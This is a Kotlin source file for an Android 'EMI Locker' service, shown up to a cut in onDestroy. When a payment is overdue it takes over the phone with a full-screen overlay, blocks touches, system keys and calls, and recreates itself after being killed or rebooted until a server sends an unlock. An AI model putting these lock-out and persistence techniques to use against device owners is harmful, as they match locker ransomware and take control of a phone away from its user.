package com.rohit.emilockercustomer

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.*
import android.widget.*
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat

/**
 * System Overlay Service - Creates full-screen overlay that blocks phone usage
 * 
 * Features:
 * - Full-screen overlay using WindowManager
 * - Overlay stays on top of everything (TYPE_APPLICATION_OVERLAY)
 * - Overlay catches all touches (blocks phone usage)
 * - Launches automatically on boot (via BootReceiver)
 * - Controlled by server via FCM push notifications
 */
class SystemOverlayService : Service() {
    
    companion object {
        private const val TAG = "SystemOverlayService"
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "overlay_service_channel"
        private const val PREFS_NAME = "overlay_prefs"
        private const val KEY_IS_LOCKED = "is_locked"
        private const val KEY_LOCK_MESSAGE = "lock_message"
        private const val KEY_LOCK_AMOUNT = "lock_amount"
        
        var isOverlayShowing = false
            private set
        
        @Volatile
        private var isServiceRunning = false
        
        @Volatile
        private var isBlockingActivityShowing = false
        
        fun isRunning(): Boolean = isServiceRunning
        fun isBlockingActivityActive(): Boolean = isBlockingActivityShowing
        fun setBlockingActivityActive(active: Boolean) {
            isBlockingActivityShowing = active
        }
    }
    
    private var windowManager: WindowManager? = null
    private var overlayView: View? = null
    private var overlayParams: WindowManager.LayoutParams? = null
    private var watchdogHandler: android.os.Handler? = null
    private var watchdogRunnable: Runnable? = null
    
    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "========== SystemOverlayService CREATED ==========")
        
        // Mark service as running
        isServiceRunning = true
        
        try {
            windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            createNotificationChannel()
            
            // Initialize watchdog handler
            watchdogHandler = android.os.Handler(android.os.Looper.getMainLooper())
            
            Log.d(TAG, "✅ Service onCreate completed successfully")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error in onCreate: ${e.message}", e)
            // Don't throw - let onStartCommand handle it
        }
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.e(TAG, "========== onStartCommand CALLED ==========")
        Log.e(TAG, "Action: ${intent?.action}")
        Log.e(TAG, "Flags: $flags, StartId: $startId")
        Log.e(TAG, "Called from: ${if (intent?.getStringExtra("from") != null) intent.getStringExtra("from") else "unknown"}")
        
        // CRITICAL: Call startForeground() IMMEDIATELY at the start of onStartCommand()
        // Android requires this within 5 seconds of startForegroundService()
        // This MUST be the first thing we do, before any other operations
        // Use a simple notification to avoid any delays
        try {
            // Create a simple notification immediately - don't call createNotification() which might have delays
            val notification = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // Ensure channel exists
                val notificationManager = getSystemService(NotificationManager::class.java)
                if (notificationManager.getNotificationChannel(CHANNEL_ID) == null) {
                    createNotificationChannel()
                }
                
                NotificationCompat.Builder(this, CHANNEL_ID)
                    .setContentTitle("EMI Locker")
                    .setContentText("Device Lock Service")
                    .setSmallIcon(android.R.drawable.ic_dialog_alert)
                    .setPriority(NotificationCompat.PRIORITY_LOW)
                    .setOngoing(true)
                    .build()
            } else {
                @Suppress("DEPRECATION")
                NotificationCompat.Builder(this)
                    .setContentTitle("EMI Locker")
                    .setContentText("Device Lock Service")
                    .setSmallIcon(android.R.drawable.ic_dialog_alert)
                    .setPriority(NotificationCompat.PRIORITY_LOW)
                    .setOngoing(true)
                    .build()
            }
            
            startForeground(NOTIFICATION_ID, notification)
            Log.d(TAG, "✅ Foreground service started immediately in onStartCommand")
        } catch (e: Exception) {
            Log.e(TAG, "❌ CRITICAL ERROR: Failed to start foreground service: ${e.message}", e)
            Log.e(TAG, "Stack trace: ${e.stackTraceToString()}")
            // Don't stop service - let it try to continue
            // If we stop here, Android will crash the app
        }
        
        // Now handle the actual command
        try {
            when (intent?.action) {
                "SHOW_OVERLAY" -> {
                    val message = intent.getStringExtra("message") ?: "Your EMI is overdue. Please contact shopkeeper."
                    val amount = intent.getStringExtra("amount") ?: "0"
                    val isProtectionOverlay = intent.getBooleanExtra("is_protection_overlay", false)
                    
                    // Save lock status to SharedPreferences
                    val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                    val editor = prefs.edit()
                        .putBoolean(KEY_IS_LOCKED, true)
                        .putString(KEY_LOCK_MESSAGE, message)
                        .putString(KEY_LOCK_AMOUNT, amount)
                    
                    if (isProtectionOverlay) {
                        editor.putBoolean("is_protection_mode", true)
                    }
                    
                    editor.commit()
                    
                    showOverlay(message, amount, isProtectionOverlay)
                }
                "HIDE_OVERLAY" -> {
                    Log.e(TAG, "========== HIDE_OVERLAY ACTION RECEIVED ==========")
                    Log.e(TAG, "Unlock command received - hiding overlay and stopping service")
                    
                    // CRITICAL: For HIDE_OVERLAY, we don't need to keep service running
                    // But we still need to call startForeground() because we're a foreground service
                    // So call it, then hide overlay and stop service
                    hideOverlay()
                    // Service will stop itself in hideOverlay()
                    return START_NOT_STICKY // CRITICAL: Don't restart service after unlock
                }
                "CHECK_AND_SHOW_OVERLAY" -> {
                    // Check if device should be locked (from SharedPreferences)
                    checkAndShowOverlayIfLocked()
                }
                null -> {
                    // No action specified - service restarted automatically
                    // Check if overlay should be shown (service restart scenario)
                    Log.e(TAG, "========== SERVICE RESTARTED (NO ACTION) ==========")
                    Log.e(TAG, "Checking if overlay should be shown after restart...")
                    
                    // CRITICAL: Check lock status FIRST before showing overlay
                    val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                    val isLocked = prefs.getBoolean(KEY_IS_LOCKED, false)
                    
                    Log.e(TAG, "Device lock status from SharedPreferences: $isLocked")
                    
                    if (!isLocked) {
                        Log.e(TAG, "✅✅✅ Device is UNLOCKED - service restarted but NO OVERLAY NEEDED ✅✅✅")
                        Log.e(TAG, "Stopping service immediately - device is unlocked")
                        
                        // CRITICAL: Remove any existing overlay view (in case it exists)
                        try {
                            overlayView?.let { view ->
                                if (view.parent != null) {
                                    windowManager?.removeView(view)
                                    Log.e(TAG, "✅ Removed existing overlay view (device unlocked)")
                                }
                            }
                            overlayView = null
                            overlayParams = null
                            isOverlayShowing = false
                        } catch (e: Exception) {
                            Log.e(TAG, "Error removing overlay view: ${e.message}")
                        }
                        
                        // Stop watchdog
                        stopWatchdog()
                        
                        // Stop call blocking
                        stopCallBlocking()
                        
                        // Stop service if device is unlocked
                        stopSelf()
                        return START_NOT_STICKY // CRITICAL: Don't restart service if unlocked
                    }
                    
                    Log.e(TAG, "Device is LOCKED - checking if overlay should be shown")
                    checkAndShowOverlayIfLocked()
                }
                else -> {
                    Log.w(TAG, "Unknown action: ${intent?.action}")
                    // Even for unknown action, check if overlay should be shown
                    checkAndShowOverlayIfLocked()
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error handling command: ${e.message}", e)
        }
        
        // CRITICAL: Return START_STICKY only if device is locked
        // If device is unlocked, return START_NOT_STICKY to prevent restart
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val isLocked = prefs.getBoolean(KEY_IS_LOCKED, false)
        
        if (isLocked) {
            return START_STICKY // Service will restart if killed (device is locked)
        } else {
            Log.d(TAG, "Device is unlocked - returning START_NOT_STICKY")
            return START_NOT_STICKY // Don't restart if device is unlocked
        }
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    /**
     * Check if device is locked and show overlay if needed
     * Called on boot or when service starts
     */
    private fun checkAndShowOverlayIfLocked() {
        Log.d(TAG, "========== CHECKING IF DEVICE SHOULD BE LOCKED ==========")
        
        // Note: startForeground() is already called in onStartCommand()
        
        // Check immediately first (no delay for faster response)
        try {
            val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val isLocked = prefs.getBoolean(KEY_IS_LOCKED, false)
            
            Log.d(TAG, "Device lock status from SharedPreferences: $isLocked")
            
            if (isLocked) {
                Log.d(TAG, "✅ Device is locked - checking overlay status")
                val message = prefs.getString(KEY_LOCK_MESSAGE, "Your EMI is overdue. Please contact shopkeeper.") ?: "Your EMI is overdue. Please contact shopkeeper."
                val amount = prefs.getString(KEY_LOCK_AMOUNT, "0") ?: "0"
                
                // Check if overlay is already showing
                if (overlayView != null && overlayView?.parent != null && isOverlayShowing) {
                    Log.d(TAG, "✅ Overlay is already showing - ensuring watchdog is running")
                    // Just ensure watchdog is running
                    if (watchdogRunnable == null) {
                        startWatchdog()
                    }
                    // Update notification
                    try {
                        val notification = createNotification("Device Locked - Payment Required")
                        startForeground(NOTIFICATION_ID, notification)
                    } catch (e: Exception) {
                        Log.e(TAG, "Error updating notification: ${e.message}")
                    }
                } else {
                    Log.d(TAG, "⚠️ Overlay not showing - recreating overlay")
                    // Update notification
                    try {
                        val notification = createNotification("Device Locked - Payment Required")
                        startForeground(NOTIFICATION_ID, notification)
                    } catch (e: Exception) {
                        Log.e(TAG, "Error updating notification: ${e.message}")
                    }
                    // Show overlay
                    showOverlay(message, amount)
                    // Start call blocking when overlay is shown
                    startCallBlocking()
                }
            } else {
                Log.d(TAG, "Device is not locked - overlay will not be shown")
                // Service is already running as foreground, just keep it running
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error checking lock status: ${e.message}", e)
            // Retry after delay
            Handler(Looper.getMainLooper()).postDelayed({
                try {
                    val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                    val isLocked = prefs.getBoolean(KEY_IS_LOCKED, false)
                    if (isLocked) {
                        val message = prefs.getString(KEY_LOCK_MESSAGE, "Your EMI is overdue. Please contact shopkeeper.") ?: "Your EMI is overdue. Please contact shopkeeper."
                        val amount = prefs.getString(KEY_LOCK_AMOUNT, "0") ?: "0"
                        showOverlay(message, amount)
                    }
                } catch (e2: Exception) {
                    Log.e(TAG, "❌ Error in retry: ${e2.message}", e2)
                }
            }, 1000)
        }
    }
    
    /**
     * Show full-screen overlay that blocks phone usage
     */
    private fun showOverlay(message: String, amount: String, isProtectionOverlay: Boolean = false) {
        Log.d(TAG, "========== SHOWING SYSTEM OVERLAY ==========")
        Log.d(TAG, "Message: $message")
        Log.d(TAG, "Amount: $amount")
        
        // CRITICAL: Store lock status in SharedPreferences FIRST (before anything else)
        // This MUST be saved so BootReceiver can read it on boot
        // Save it IMMEDIATELY so even if overlay fails, status is saved for boot recovery
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        prefs.edit()
            .putBoolean(KEY_IS_LOCKED, true)
            .putString(KEY_LOCK_MESSAGE, message)
            .putString(KEY_LOCK_AMOUNT, amount)
            .commit() // Use commit() instead of apply() to ensure it's saved immediately
        
        Log.d(TAG, "✅ Lock status saved to SharedPreferences for boot recovery (IMMEDIATE)")
        Log.d(TAG, "   is_locked: true")
        Log.d(TAG, "   lock_message: $message")
        Log.d(TAG, "   lock_amount: $amount")
        
        // Check if we have overlay permission
        if (!canDrawOverlays()) {
            Log.e(TAG, "❌ No overlay permission granted")
            Log.e(TAG, "🚨 Showing blocking activity instead of overlay")
            
            // Show blocking activity immediately
            try {
                val blockingIntent = Intent(this, OverlayPermissionBlockingActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
                }
                startActivity(blockingIntent)
                Log.d(TAG, "✅ Blocking activity shown (no overlay permission)")
            } catch (e: Exception) {
                Log.e(TAG, "❌ Error showing blocking activity: ${e.message}", e)
            }
            
            // Still start foreground to avoid crash, but keep service running
            startForeground(NOTIFICATION_ID, createNotification("Overlay permission required"))
            // Don't stop service - keep it running to monitor permission
            return
        }
        
        // CRITICAL: Show overlay FIRST, then update notification
        // This ensures overlay appears immediately without waiting for notification
        Log.e(TAG, "Creating overlay view IMMEDIATELY...")
        
        // Hide existing overlay if showing (but don't stop service)
        hideOverlayViewOnly()
        
        try {
            // Create overlay view IMMEDIATELY
            overlayView = createOverlayView(message, amount, isProtectionOverlay)
            
            // Set up layout parameters with proper flags
            val layoutFlag = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            } else {
                @Suppress("DEPRECATION")
                WindowManager.LayoutParams.TYPE_PHONE
            }
            
            overlayParams = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                layoutFlag,
                // Window flags for overlay behavior
                // CRITICAL: Remove FLAG_NOT_TOUCH_MODAL - we want to intercept ALL touches
                // CRITICAL: Remove FLAG_WATCH_OUTSIDE_TOUCH - we want to block everything
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR or
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_FULLSCREEN or
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
                PixelFormat.TRANSLUCENT
            ).apply {
                // Set gravity to cover entire screen
                gravity = Gravity.TOP or Gravity.START
                x = 0
                y = 0
            }
            
            // CRITICAL: Add view to window manager IMMEDIATELY (this makes overlay visible)
            try {
                windowManager?.addView(overlayView, overlayParams)
                isOverlayShowing = true
                
                Log.e(TAG, "✅✅✅ SYSTEM OVERLAY DISPLAYED SUCCESSFULLY ✅✅✅")
                Log.e(TAG, "🔒 Phone is now locked - all touches are blocked")
                Log.e(TAG, "Overlay view added to WindowManager - should be visible NOW")
                
                // Start watchdog to ensure overlay stays visible
                startWatchdog()
                
                // Start call blocking service
                startCallBlocking()
                
                // Update notification AFTER overlay is shown (non-blocking, doesn't delay overlay)
                try {
                    val notification = createNotification("Device Locked - Payment Required")
                    startForeground(NOTIFICATION_ID, notification)
                    Log.d(TAG, "✅ Notification updated for locked device")
                } catch (e: Exception) {
                    Log.e(TAG, "❌ Error updating notification (non-critical): ${e.message}", e)
                    // Don't return - overlay is already showing
                }
                
                // Update notification AFTER overlay is shown (non-blocking, doesn't delay overlay)
                try {
                    val notification = createNotification("Device Locked - Payment Required")
                    startForeground(NOTIFICATION_ID, notification)
                    Log.d(TAG, "✅ Notification updated for locked device")
                } catch (e: Exception) {
                    Log.e(TAG, "❌ Error updating notification (non-critical): ${e.message}", e)
                    // Don't return - overlay is already showing
                }
                
                // Keep service running - don't let it be destroyed
                // The service must stay alive as long as overlay is showing
            } catch (e: Exception) {
                Log.e(TAG, "❌ Error adding overlay view: ${e.message}", e)
                // If we can't add view, keep service running anyway
                // Don't stop service - let watchdog try to re-add it
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error showing overlay: ${e.message}", e)
            // Don't stop service immediately - let it run for a bit
            // Service will be stopped by hideOverlay() when unlock command comes
        }
    }
    
    /**
     * Hide overlay view only (without stopping service)
     * Used internally when replacing overlay
     * CRITICAL: This should ONLY be called from hideOverlay() when unlock command comes
     * NOTE: Lock status check is removed - hideOverlay() already clears it before calling this
     */
    private fun hideOverlayViewOnly() {
        // CRITICAL: Don't check lock status here - hideOverlay() already cleared it
        // This method is only called from hideOverlay() after lock status is cleared
        // If we check here, it might prevent overlay removal due to race conditions
        
        try {
            overlayView?.let { view ->
                if (view.parent != null) {
                    windowManager?.removeView(view)
                    Log.e(TAG, "✅✅✅ Overlay view removed from WindowManager ✅✅✅")
                } else {
                    Log.d(TAG, "Overlay view already removed from WindowManager")
                }
                overlayView = null
                overlayParams = null
                isOverlayShowing = false
                Log.e(TAG, "✅ Overlay view removed (device unlocked)")
            } ?: run {
                Log.d(TAG, "Overlay view is null - already removed")
                isOverlayShowing = false
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error removing overlay view: ${e.message}", e)
            // Force clear state even if remove fails
            overlayView = null
            overlayParams = null
            isOverlayShowing = false
        }
        stopWatchdog()
    }
    
    /**
     * Hide overlay and unlock phone
     * This will stop the foreground service
     * CRITICAL: This should ONLY be called when unlock command comes from FCM
     */
    private fun hideOverlay() {
        Log.e(TAG, "========== HIDING SYSTEM OVERLAY ==========")
        
        // Check if this is protection mode or EMI overdue mode
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val isProtectionMode = prefs.getBoolean("is_protection_mode", false)
        
        if (isProtectionMode) {
            Log.e(TAG, "🔙 Protection mode overlay - hiding due to back button")
        } else {
            Log.e(TAG, "Unlock command received - hiding overlay IMMEDIATELY")
        }
        
        // CRITICAL: Stop watchdog FIRST to prevent it from recreating overlay
        stopWatchdog()
        Log.e(TAG, "✅ Watchdog stopped - overlay will not be recreated")
        
        // CRITICAL: Remove overlay view FIRST (before clearing SharedPreferences)
        // This ensures overlay is removed immediately, even if SharedPreferences clear fails
        try {
            overlayView?.let { view ->
                if (view.parent != null) {
                    windowManager?.removeView(view)
                    Log.e(TAG, "✅✅✅ Overlay view removed IMMEDIATELY ✅✅✅")
                }
            }
            overlayView = null
            overlayParams = null
            isOverlayShowing = false
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error removing overlay view: ${e.message}", e)
            // Force clear state even if remove fails
            overlayView = null
            overlayParams = null
            isOverlayShowing = false
        }
        
        // CRITICAL: Clear lock status from SharedPreferences IMMEDIATELY using commit()
        // Use commit() instead of apply() to ensure it's saved synchronously
        // This prevents watchdog or service restart from recreating overlay
        val cleared = prefs.edit()
            .putBoolean(KEY_IS_LOCKED, false)
            .remove(KEY_LOCK_MESSAGE)
            .remove(KEY_LOCK_AMOUNT)
            .remove("is_protection_mode") // Clear protection mode flag
            .commit() // CRITICAL: Use commit() for immediate synchronous save
        
        if (cleared) {
            if (isProtectionMode) {
                Log.e(TAG, "✅✅✅ Protection overlay hidden - user can continue ✅✅✅")
            } else {
                Log.e(TAG, "✅✅✅ Lock status cleared IMMEDIATELY - device is now unlocked ✅✅✅")
            }
        } else {
            Log.e(TAG, "❌❌❌ CRITICAL: Failed to clear lock status! ❌❌❌")
        }
        
        // Verify lock status is cleared
        val isStillLocked = prefs.getBoolean(KEY_IS_LOCKED, false)
        if (isStillLocked) {
            Log.e(TAG, "❌❌❌ CRITICAL ERROR: Lock status still true after clear! ❌❌❌")
            // Force clear again
            prefs.edit().putBoolean(KEY_IS_LOCKED, false).remove("is_protection_mode").commit()
        }
        
        // Stop watchdog again (in case it was restarted)
        stopWatchdog()
        
        // Stop call blocking service
        stopCallBlocking()
        
        // Stop foreground service and stop self
        // Use stopForeground with removeNotification = true
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                stopForeground(Service.STOP_FOREGROUND_REMOVE)
            } else {
                @Suppress("DEPRECATION")
                stopForeground(true)
            }
            Log.d(TAG, "✅ Foreground service stopped")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error stopping foreground: ${e.message}", e)
        }
        
        // Stop the service
        stopSelf()
        Log.d(TAG, "✅ Service stopped")
    }
    
    /**
     * Create overlay view with lock message
     */
    private fun createOverlayView(message: String, amount: String, isProtectionOverlay: Boolean = false): View {
        val inflater = LayoutInflater.from(this)
        
        // Create main container that intercepts ALL touches
        val container = object : LinearLayout(this@SystemOverlayService) {
            override fun onInterceptTouchEvent(ev: MotionEvent?): Boolean {
                // Intercept ALL touch events - block everything
                // Don't log every touch to avoid spam
                try {
                    return true // Consume all touches - CRITICAL: Always return true
                } catch (e: Exception) {
                    // Don't let touch handling crash the overlay
                    Log.e(TAG, "Error in onInterceptTouchEvent: ${e.message}")
                    return true
                }
            }
            
            override fun onTouchEvent(event: MotionEvent?): Boolean {
                // Handle touch events but don't let them pass through
                // Always consume the event to prevent any interaction
                try {
                    return true // Consume all touches - CRITICAL: Always return true
                } catch (e: Exception) {
                    // Don't let touch handling crash the overlay
                    Log.e(TAG, "Error in onTouchEvent: ${e.message}")
                    return true
                }
            }
            
            override fun dispatchTouchEvent(ev: MotionEvent?): Boolean {
                // Intercept at dispatch level too - most important
                try {
                    return true // Consume all touches - CRITICAL: Always return true
                } catch (e: Exception) {
                    // Don't let touch handling crash the overlay
                    Log.e(TAG, "Error in dispatchTouchEvent: ${e.message}")
                    return true
                }
            }
            
            override fun dispatchKeyEvent(event: KeyEvent?): Boolean {
                // Intercept ALL key events, especially back button
                try {
                    if (event?.keyCode == KeyEvent.KEYCODE_BACK) {
                        // Check if this is protection mode (should allow back button)
                        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                        val isProtectionMode = prefs.getBoolean("is_protection_mode", false)
                        
                        if (isProtectionMode && event.action == KeyEvent.ACTION_UP) {
                            Log.e(TAG, "🔙 BACK BUTTON PRESSED - Protection mode, hiding overlay")
                            // Hide overlay for protection mode
                            hideOverlay()
                            return true
                        } else if (!isProtectionMode) {
                            Log.d(TAG, "🚫 BACK BUTTON BLOCKED - EMI overdue mode")
                            return true // Block back button for EMI overdue
                        }
                    }
                    // Block all other keys
                    return true
                } catch (e: Exception) {
                    Log.e(TAG, "Error in dispatchKeyEvent: ${e.message}")
                    return true // Always block keys even on error
                }
            }
            
            override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
                try {
                    if (keyCode == KeyEvent.KEYCODE_BACK) {
                        // Check if this is protection mode
                        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                        val isProtectionMode = prefs.getBoolean("is_protection_mode", false)
                        
                        if (isProtectionMode) {
                            Log.d(TAG, "🔙 Back button in protection mode - will hide on key up")
                            return true // Handle in dispatchKeyEvent
                        } else {
                            Log.d(TAG, "🚫 Back button blocked - EMI overdue mode")
                            return true // Block for EMI overdue
                        }
                    }
                    
                    if (keyCode == KeyEvent.KEYCODE_HOME ||
                        keyCode == KeyEvent.KEYCODE_MENU ||
                        keyCode == KeyEvent.KEYCODE_APP_SWITCH) {
                        Log.d(TAG, "🚫 System key blocked: $keyCode")
                        return true // Block system keys
                    }
                    return super.onKeyDown(keyCode, event)
                } catch (e: Exception) {
                    Log.e(TAG, "Error in onKeyDown: ${e.message}")
                    return true // Always block keys even on error
                }
            }
            
            override fun onKeyUp(keyCode: Int, event: KeyEvent?): Boolean {
                try {
                    if (keyCode == KeyEvent.KEYCODE_BACK) {
                        // Check if this is protection mode
                        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                        val isProtectionMode = prefs.getBoolean("is_protection_mode", false)
                        
                        if (isProtectionMode) {
                            Log.e(TAG, "🔙 BACK BUTTON UP - Protection mode, hiding overlay")
                            hideOverlay()
                            return true
                        } else {
                            Log.d(TAG, "🚫 Back button blocked - EMI overdue mode")
                            return true // Block for EMI overdue
                        }
                    }
                    
                    if (keyCode == KeyEvent.KEYCODE_HOME ||
                        keyCode == KeyEvent.KEYCODE_MENU ||
                        keyCode == KeyEvent.KEYCODE_APP_SWITCH) {
                        return true // Block system keys
                    }
                    return super.onKeyUp(keyCode, event)
                } catch (e: Exception) {
                    Log.e(TAG, "Error in onKeyUp: ${e.message}")
                    return true // Always block keys even on error
                }
            }
        }.apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(ContextCompat.getColor(this@SystemOverlayService, android.R.color.black))
            alpha = 0.95f // Semi-transparent black background
            gravity = Gravity.CENTER
            setPadding(50, 50, 50, 50)
            isFocusable = true
            isFocusableInTouchMode = true
            visibility = View.VISIBLE // CRITICAL: Ensure visibility is always VISIBLE
            requestFocus() // Request focus to receive key events
        }
        
        // Create card container for message
        val cardContainer = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(ContextCompat.getColor(this@SystemOverlayService, android.R.color.white))
            setPadding(60, 60, 60, 60)
            gravity = Gravity.CENTER
        }
        
        // Warning icon
        val warningIcon = TextView(this).apply {
            text = if (isProtectionOverlay) "🛡️" else "⚠️"
            textSize = 48f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 30)
        }
        
        // Title
        val titleView = TextView(this).apply {
            text = if (isProtectionOverlay) "App Protection Active" else "Your EMI is Overdue"
            textSize = 24f
            setTextColor(ContextCompat.getColor(this@SystemOverlayService, 
                if (isProtectionOverlay) android.R.color.holo_blue_dark else android.R.color.holo_red_dark))
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 20)
            setTypeface(null, android.graphics.Typeface.BOLD)
        }
        
        // Message
        val messageView = TextView(this).apply {
            text = message
            textSize = 16f
            setTextColor(ContextCompat.getColor(this@SystemOverlayService, android.R.color.black))
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 20)
        }
        
        // Amount container
        val amountContainer = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(ContextCompat.getColor(this@SystemOverlayService, android.R.color.holo_blue_light))
            setPadding(40, 30, 40, 30)
            gravity = Gravity.CENTER
        }
        
        val amountLabel = TextView(this).apply {
            text = "Due Amount"
            textSize = 14f
            setTextColor(ContextCompat.getColor(this@SystemOverlayService, android.R.color.black))
            gravity = Gravity.CENTER
        }
        
        val amountValue = TextView(this).apply {
            text = "₹$amount"
            textSize = 32f
            setTextColor(ContextCompat.getColor(this@SystemOverlayService, android.R.color.holo_blue_dark))
            gravity = Gravity.CENTER
            setTypeface(null, android.graphics.Typeface.BOLD)
        }
        
        amountContainer.addView(amountLabel)
        amountContainer.addView(amountValue)
        
        // Contact shopkeeper button
        val contactButton = Button(this).apply {
            text = "Contact Shopkeeper"
            textSize = 18f
            setTextColor(ContextCompat.getColor(this@SystemOverlayService, android.R.color.white))
            setBackgroundColor(ContextCompat.getColor(this@SystemOverlayService, android.R.color.holo_red_dark))
            setPadding(60, 30, 60, 30)
            setTypeface(null, android.graphics.Typeface.BOLD)
            
            setOnClickListener {
                Log.d(TAG, "Contact shopkeeper button clicked")
                // Open main app
                openMainApp()
            }
        }
        
        // Add all views to card
        cardContainer.addView(warningIcon)
        cardContainer.addView(titleView)
        cardContainer.addView(messageView)
        cardContainer.addView(amountContainer)
        
        // Add margin before button
        val buttonMargin = View(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                40
            )
        }
        cardContainer.addView(buttonMargin)
        cardContainer.addView(contactButton)
        
        // Add card to main container
        container.addView(cardContainer)
        
        return container
    }
    
    /**
     * Open main app when user clicks button
     */
    private fun openMainApp() {
        try {
            val intent = packageManager.getLaunchIntentForPackage(packageName)?.apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            startActivity(intent)
            Log.d(TAG, "Main app opened")
        } catch (e: Exception) {
            Log.e(TAG, "Error opening main app: ${e.message}", e)
        }
    }
    
    /**
     * Check if overlay permission is granted
     */
    private fun canDrawOverlays(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Settings.canDrawOverlays(this)
        } else {
            true
        }
    }
    
    /**
     * Create notification channel for foreground service
     */
    private fun createNotificationChannel() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val notificationManager = getSystemService(NotificationManager::class.java)
                
                // Check if channel already exists
                if (notificationManager.getNotificationChannel(CHANNEL_ID) == null) {
                    val channel = NotificationChannel(
                        CHANNEL_ID,
                        "Overlay Service",
                        NotificationManager.IMPORTANCE_LOW
                    ).apply {
                        description = "Service for system-wide overlay display"
                        setShowBadge(false)
                    }
                    
                    notificationManager.createNotificationChannel(channel)
                    Log.d(TAG, "✅ Notification channel created")
                } else {
                    Log.d(TAG, "Notification channel already exists")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error creating notification channel: ${e.message}", e)
        }
    }
    
    /**
     * Create notification for foreground service
     */
    private fun createNotification(contentText: String): Notification {
        try {
            // Ensure channel exists before creating notification
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val notificationManager = getSystemService(NotificationManager::class.java)
                if (notificationManager.getNotificationChannel(CHANNEL_ID) == null) {
                    Log.w(TAG, "Notification channel missing, creating it now...")
                    createNotificationChannel()
                }
            }
            
            return NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("EMI Locker")
                .setContentText(contentText)
                .setSmallIcon(android.R.drawable.ic_dialog_alert)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build()
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error creating notification: ${e.message}", e)
            // Return a basic notification even if there's an error
            return NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("EMI Locker")
                .setContentText(contentText)
                .setSmallIcon(android.R.drawable.ic_dialog_alert)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build()
        }
    }
    
    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "========== SystemOverlayService DESTROYED ==========")
        
        // Mark service as not running
        isServiceRunning = false
        
        // CRITICAL: Check if device is still locked before removing overlay
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val isLocked = prefs.getBoolean(KEY_IS_LOCKED, false)
        
        if (isLocked) {
            Log.w(TAG, "⚠️ WARNING: Service destroyed but device is still locked!")
            Log.w(TAG, "⚠️ Service will restart automatically (START_STICKY)")
            Log.w(TAG, "⚠️ Overlay will be recreated when service restarts")
            
            // CRITICAL: Don't remove overlay view - keep it showing
            // The overlay view will stay even if service is destroyed
            // When service restarts, it will check if overlay exists and recreate if needed
            try {
                if (overlayView != null && overlayView?.parent != null) {
